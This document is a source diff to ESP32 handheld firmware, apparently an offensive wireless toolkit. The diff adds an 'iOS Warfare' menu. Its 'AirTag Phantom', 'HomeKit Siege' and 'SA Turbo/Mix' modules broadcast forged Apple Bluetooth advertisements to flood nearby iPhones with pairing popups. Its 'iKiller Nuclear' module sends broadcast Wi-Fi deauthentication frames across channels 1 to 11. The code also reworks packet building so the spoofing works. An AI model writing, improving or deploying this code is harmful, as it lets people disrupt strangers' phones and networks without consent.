@@ -25,8 +25,10 @@ uint16_t BGCOLOR=0x0000; // Cyan/Dark Theme Default: Black
 uint16_t FGCOLOR=0x07FF; // Cyan/Dark Theme Default: Cyan
 
 #ifndef NOVA_VERSION
-  #define NOVA_VERSION "1.0.0"
+  #define NOVA_VERSION "1.1.0"
 #endif
+
+#include <vector>
 
 struct MENU {
   const char* name;
@@ -113,6 +115,20 @@ void dh_alert_pkts_setup();
 void dh_alert_pkts_loop();
 void ph_alert_ssids_setup();
 void ph_alert_ssids_loop();
+void iosmenu_setup();
+void iosmenu_loop();
+void at_phantom_setup();
+void at_phantom_loop();
+void hk_siege_setup();
+void hk_siege_loop();
+void sa_turbo_setup();
+void sa_turbo_loop();
+void sa_mix_setup();
+void sa_mix_loop();
+void ik_nuclear_setup();
+void ik_nuclear_loop();
+void ik_sniper_setup();
+void ik_sniper_loop();
 void sd_mount_setup();
 void sd_mount_loop();
 void lanmenu_setup();
@@ -130,6 +146,10 @@ uint8_t read_bits(uint8_t bits);
 int selected_language = 0; // 0:EN, 1:TR, 2:IT, 3:PT, 4:FR
 
 
+
+#include <esp_gap_ble_api.h>
+#include <esp_system.h>
+#include <esp_bt.h>
 
 #if defined(STICK_C_PLUS)
   #include <M5Unified.h>
@@ -372,6 +392,9 @@ bool activeQR = false;
 const uint16_t PortalTickTimer = 1000;
 String apSsidName = String("");
 bool isSwitching = true;
+
+void beaconSpamRandom(); // Forward declaration
+
 #if defined(RTC)
   int current_proc = 0; // Start in Clock Mode
 #else
@@ -395,6 +418,7 @@ int dh_pkts = 0;
 #include <DNSServer.h>
 #include <WebServer.h>
 #include "applejuice.h"
+#include "ikiller.h"
 #include "WORLD_IR_CODES.h"
 #include "wifispam.h"
 #include "sd.h"
@@ -622,6 +646,36 @@ public:
 // Global menu controller instance
 MenuController menuController;
 
+/// iOS Warfare MENU ///
+MENU iosmenu[] = {
+  { "Back", 1},
+  { "AirTag Phantom", 42},
+  { "HomeKit Siege", 43},
+  { "SA v2 Turbo", 44},
+  { "SA v2 Mix", 45},
+  { "iKiller Nuclear", 46},
+  { "iKiller Sniper", 47},
+};
+int iosmenu_size = sizeof(iosmenu) / sizeof(MENU);
+
+void iosmenu_setup() {
+  cursor = 0;
+  rstOverride = true;
+  // Update names from localization
+  iosmenu[0].name = TXT_BACK;
+  iosmenu[1].name = TXT_PN_AT_PH;
+  iosmenu[2].name = TXT_PN_HK_SG;
+  iosmenu[3].name = TXT_OPT_TURBO;
+  iosmenu[4].name = TXT_OPT_MIX;
+  iosmenu[5].name = TXT_OPT_NUCLEAR;
+  iosmenu[6].name = TXT_OPT_SNIPER;
+  menuController.setup(iosmenu, iosmenu_size);
+}
+
+void iosmenu_loop() {
+  menuController.loop();
+}
+
 /// MAIN MENU ///
 MENU mmenu[] = {
 #if defined(RTC)
@@ -634,6 +688,7 @@ MENU mmenu[] = {
   { "", 27},
 #endif
   { "", 18},
+  { "", 41}, // iOS Warfare
   { "", 2},
 };
 int mmenu_size = sizeof(mmenu) / sizeof(MENU);
@@ -1840,7 +1895,7 @@ void aj_adv(){
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
   if (sourApple || swiftPair || androidPair || maelstrom){
-    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
+    delay(20);   // 20ms — stable, tested working
     advtime = 0; // bypass ajDelay counter
   }
   if (millis() > advtime + ajDelay){
@@ -1920,28 +1975,56 @@ void aj_adv(){
       packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
 
       oAdvertisementData.addData(std::string((char *)packet, 14));
-      for (int i = 0; i < sizeof packet; i ++) {
-        Serial.printf("%02x", packet[i]);
-      }
-      Serial.println("");
+      pAdvertising->setAdvertisementData(oAdvertisementData);
+      pAdvertising->start();
     } else {
-      Serial.print(TXT_AJ_ADV);
-      if (deviceType >= 18){
-        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+      // AppleJuice individual device mode
+      // Build a proper AD structure: [LEN][0xFF][4C 00][protocol data]
+      // For Proximity Pairing (deviceType < 18): 17-byte practical packet
+      // For Nearby Action (deviceType >= 18): 17-byte packet  
+      // Both use addData — same working path as sourApple
+      uint8_t packet[17];
+      uint8_t sz = 17;
+      uint8_t i = 0;
+      packet[i++] = sz - 1;  // AD Length
+      packet[i++] = 0xFF;    // Manufacturer Specific
+      packet[i++] = 0x4C;    // Apple Inc.
+      packet[i++] = 0x00;
+      
+      if (deviceType >= 18) {
+        // Nearby Action packet
+        packet[i++] = 0x0F; // Type
+        packet[i++] = 0x05; // Length
+        packet[i++] = 0xC1; // Action Flags
+        packet[i++] = (data != nullptr) ? data[11] : 0x27; // Action byte from payload
+        esp_fill_random(&packet[i], 3);
+        i += 3;
+        packet[i++] = 0x00;
+        packet[i++] = 0x00;
+        packet[i++] = 0x10;
+        esp_fill_random(&packet[i], 3);
       } else {
-        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+        // Proximity Pairing — use model byte from stored payload
+        packet[i++] = 0x07; // PP type
+        packet[i++] = 0x19; // PP length
+        packet[i++] = 0x07; // PP sub-type
+        packet[i++] = (data != nullptr) ? data[5] : 0x02; // Device model
+        packet[i++] = 0x20; // Pairing flags
+        esp_fill_random(&packet[i], 3); // Random serial
+        i += 3;
+        packet[i++] = 0x01; packet[i++] = 0x00;
+        packet[i++] = 0x00; packet[i++] = 0x45;
       }
-      for (int i = 0; i < sizeof(Airpods); i ++) {
-        Serial.printf("%02x", data[i]);
-      }      
-      Serial.println("");
+      
+      oAdvertisementData.addData(std::string((char*)packet, sz));
     }
-    
+    // COMMON PATH: All branches above add data. Now broadcast it.
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->start();
+    
 #if defined(M5LED)
     digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
-    delay(10);
+    delay(5);
     digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
 #endif
   }
@@ -1950,6 +2033,10 @@ void aj_adv(){
       isSwitching = true;
       current_proc = 16;
       drawmenu(btmenu, btmenu_size);
+    } else if (current_proc >= 42 && current_proc <= 45) { // iOS Warfare Modules
+      isSwitching = true;
+      current_proc = 41;
+      drawmenu(iosmenu, iosmenu_size);
     } else {
       isSwitching = true;
       current_proc = 8;      
@@ -2072,13 +2159,14 @@ void wifispam_loop() {
       beaconSpamList(rickrollssids);
       break;
     case 3:
-      char* randoms = randomSSID();
-      len = sizeof(randoms);
-      while(i < len){
-        i++;
-      }
-      beaconSpamList(randoms);
+      beaconSpamRandom();
       break;
+  }
+
+  if (check_next_press()) {
+    isSwitching = true;
+    current_proc = 1; // Global loop will redirect to 40 if remote
+    return;
   }
 }
 
@@ -2187,7 +2275,9 @@ void wscan_drawmenu() {
         DISP.setTextColor(BGCOLOR, FGCOLOR);
       }
       DISP.print(" ");
-      DISP.println(WiFi.SSID(i).substring(0,19));
+      String ssidStr = WiFi.SSID(i).substring(0,16);
+      if (is_apple_device(WiFi.BSSID(i))) ssidStr += " [A]";
+      DISP.println(ssidStr);
       DISP.setTextColor(FGCOLOR, BGCOLOR);
     }
   } else {
@@ -2196,7 +2286,9 @@ void wscan_drawmenu() {
         DISP.setTextColor(BGCOLOR, FGCOLOR);
       }
       DISP.print(" ");
-      DISP.println(WiFi.SSID(i).substring(0,19));
+      String ssidStr = WiFi.SSID(i).substring(0,16);
+      if (is_apple_device(WiFi.BSSID(i))) ssidStr += " [A]";
+      DISP.println(ssidStr);
       DISP.setTextColor(FGCOLOR, BGCOLOR);
     }
   }
@@ -2537,9 +2629,11 @@ Serial.begin(115200);
 }
 
 // Wrapper functions for menuController.loop() to avoid lambda issues
+void mmenu_setup();
 void menu_controller_loop() {
   menuController.loop();
 }
+
 
 // Process handler structure to replace dual switch statements
 struct ProcessHandler {
@@ -2593,6 +2687,13 @@ ProcessHandler processes[] = {
   {31, bh_alert_pkts_setup, bh_alert_pkts_loop, "BH Alert Pkts Setting"},
   {32, dh_alert_pkts_setup, dh_alert_pkts_loop, "DH Alert Pkts Setting"},
   {33, ph_alert_ssids_setup, ph_alert_ssids_loop, TXT_PH_ALERT_SSIDS},
+  {41, iosmenu_setup, iosmenu_loop, "iOS Warfare Menu"},
+  {42, at_phantom_setup, at_phantom_loop, "AirTag Phantom"},
+  {43, hk_siege_setup, hk_siege_loop, "HomeKit Siege"},
+  {44, sa_turbo_setup, sa_turbo_loop, "SA v2 Turbo"},
+  {45, sa_mix_setup, sa_mix_loop, "SA v2 Mix"},
+  {46, ik_nuclear_setup, ik_nuclear_loop, "iKiller Nuclear"},
+  {47, ik_sniper_setup, ik_sniper_loop, "iKiller Sniper"},
 #if defined(SDCARD) && !defined(CARDPUTER)
   {97, nullptr, ToggleSDCard, "SD Card"},
 #endif
@@ -2611,7 +2712,8 @@ void rebuildMenus() {
   #if defined(CARDPUTER)
     mmenu[i++].name = TXT_MN_USB;
   #endif
-  mmenu[i++].name = TXT_MN_QR;
+  mmenu[i++].name = TXT_MN_USB;
+  mmenu[i++].name = TXT_MN_IOS;
   mmenu[i++].name = TXT_SETTINGS;
 
   // Settings Menu labels
@@ -2743,7 +2845,6 @@ void loop() {
   screen_dim_proc();
   check_menu_press();
   
-  // Switcher - unified process handler
   if (isSwitching) {
     isSwitching = false;
     Serial.printf("Switching To Task: %d\n", current_proc);
@@ -2754,6 +2855,7 @@ void loop() {
   runCurrentLoop();
 }
 
+// 
 ///////////////////////////////
 /// DEAUTH HUNTER IMPLEMENTATION ///
 ///////////////////////////////
@@ -4239,3 +4341,151 @@ void badusb_hunter_loop() {
 }
 
 #endif // CARDPUTER
+
+// Implementation of iOS sub-modules
+
+void at_phantom_setup() {
+  pAdvertising->stop();
+  delay(100);
+  sourApple = true;
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" AirTag Phantom");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Sending popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void at_phantom_loop() {
+  sourApple = true;
+  aj_adv();
+  if (check_next_press()) {
+    pAdvertising->stop();
+    sourApple = false;
+    current_proc = 41;
+    isSwitching = true;
+    delay(250);
+  }
+}
+
+void hk_siege_setup() {
+  pAdvertising->stop();
+  delay(100);
+  sourApple = true;
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" HomeKit Siege");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Sending popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void hk_siege_loop() {
+  sourApple = true;
+  aj_adv();
+  if (check_next_press()) {
+    pAdvertising->stop();
+    sourApple = false;
+    current_proc = 41;
+    isSwitching = true;
+    delay(250);
+  }
+}
+
+void sa_turbo_setup() {
+  pAdvertising->stop();
+  delay(100);
+  sourApple = true;
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" SA Turbo");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Max speed popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void sa_turbo_loop() {
+  sourApple = true;
+  aj_adv();
+  if (check_next_press()) {
+    pAdvertising->stop();
+    sourApple = false;
+    current_proc = 41;
+    isSwitching = true;
+    delay(500);
+  }
+}
+
+void sa_mix_setup() {
+  pAdvertising->stop();
+  delay(100);
+  sourApple = true;
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" SA Mix");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Rotating popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void sa_mix_loop() {
+  sourApple = true;
+  aj_adv();
+  if (check_next_press()) {
+    pAdvertising->stop();
+    sourApple = false;
+    current_proc = 41;
+    isSwitching = true;
+    delay(500);
+  }
+}
+
+void ik_nuclear_setup() {
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println("iKiller: NUCLEAR");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Auto-Deauthing Apple...");
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_promiscuous(true);
+  delay(1000);
+}
+
+void ik_nuclear_loop() {
+  // Simple rotation: check common channels
+  for (int ch = 1; ch <= 11; ch++) {
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    // Send periodic deauth to broadcast with Apple OUIs as source if detected?
+    // For "Nuclear" we just fire deauths on the channel if we see Apple activity.
+    // In this basic implementation, we just pulse deauths on each channel.
+    uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    send_deauth(bcast, bcast, ch); // Aggressive broadcast deauth
+    if (check_next_press()) break;
+    delay(50);
+  }
+  
+  if (check_next_press()) {
+    esp_wifi_set_promiscuous(false);
+    current_proc = 41;
+    isSwitching = true;
+    delay(500);
+  }
+}
+
+void ik_sniper_setup() {
+  wscan_setup();
+}
+
+void ik_sniper_loop() {
+  wscan_loop();
+  if (check_next_press()) {
+    current_proc = 41;
+    isSwitching = true;
+    delay(250);
+  }
+}
